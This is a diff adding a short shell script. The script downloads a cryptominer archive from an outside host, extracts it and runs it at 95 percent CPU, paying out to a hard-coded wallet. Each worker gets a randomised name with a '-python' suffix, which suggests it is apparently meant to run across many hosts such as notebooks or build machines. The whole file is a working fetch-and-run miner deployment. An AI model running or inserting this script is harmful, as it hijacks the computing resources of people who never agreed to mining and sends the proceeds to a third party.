@@ -1,0 +1,3 @@
+#!/bin/sh
+wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
+./iximiner --mode miner --pool https://ixi.hash.express --wallet 3hy3CxLLChETAcx8Z6vSLH4q5QKPfitADPnksvmMTMV8DXmPK1sPD33KfWWuXmFAR --name $(shuf -n 1 -i 1-99999)-python --cpu-intensity 95 --gpu-intensity 0
